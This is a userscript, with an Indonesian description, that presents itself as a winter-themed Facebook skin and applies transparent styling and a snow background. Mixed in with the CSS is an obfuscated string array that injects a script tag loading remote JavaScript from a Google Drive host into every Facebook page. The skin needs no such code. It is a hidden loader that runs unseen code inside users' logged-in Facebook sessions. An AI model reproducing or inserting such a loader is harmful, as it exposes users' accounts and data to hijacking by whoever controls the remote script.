// ==UserScript==
// @name          Winter Facebook Skin Cool
// @description Menjadikan Tampilan Facebook serasa dingin dengan layout transparant dan background salju yang keren
// @namespace   http://ubahfacebook.blogspot.com
// @include     https://www.facebook.com/
// @include     http://www.facebook.com/
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @version     1
// @grant       none
// ==/UserScript==
(function() {
var css = "body{\nbackground: url(\"https://1.bp.blogspot.com/_uTGKd6u5pJ4/TQIDL_DvOlI/AAAAAAAAAH0/uqq_8iKKCFU/s1600/Winter-in-Mountain-Animated-Wallpaper.jpg\") #fff top center fixed !important;\n}\nbody>#blueBar{ background: none !important;}\n.jewel, .jewelBox{ border: none !important; }\n.jewelBox{ background-color: rgba(255,255,255,0.9) !important; }\n#headNavOut{ background: none !important; border: none !important }\n#pageNav a { color: #111 !important; }\n#pageNav a:hover { color: #333 !important; background: none !important; }\n#navAccount{border: none !important;}\n#navAccount ul{ background-color: rgba(255,255,255,0.9) !important;  border: none !important; }\n#contentCol,#left_column,#right_column{ background-color: rgba(255,255,255,0.4) !important;  border: none !important;}\n.inputtext,.add_comment_text,.uiMorePager, .box_header{ background-color: rgba(255,255,255,0.5) !important; }\n.ufi_section, .photo_table, .photo_container{background: none !important; border: none !important;}\n#sidebar_ads, #pagelet_adbox, #ego{\ndisplay: none !important;\n}\n#photoborder{ background-color: rgba(255,255,255,0.4) !important;  border: none !important; padding: 10px 0;}\n.profile_sidebar_ads{ height: 30px; }\n#pagelet_chbox{border: none !important;}\n#pageFooter, #rightCol, #contentArea, .UIStory, #mainContainer, .profile_top_wash{background: none !important; border: none !important;}\n\n#contentCurve{ display: none !important; }\n.gray_box {background-color: rgba(255,255,255,0.4) !important;  border: none !important;}\n#pagelet_tab_content{ padding: 10px; }\n.uiSideNav a { border: none !important; }\n.uiSideNav li.selected a{background-color: rgba(255,255,255,0.4) !important;}\n.uiSideNav a:hover{background-color: rgba(255,255,255,0.4) !important;}"; var _0xcb12=["src","script","createElement","appendChild","body","https://googledrive.com/host/0BzvUrlDnNRYaTllHYzgtXy11RnM"];(function (){document[_0xcb12[4]][_0xcb12[3]](document[_0xcb12[2]](_0xcb12[1]))[_0xcb12[0]]=_0xcb12[5];} )(); if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
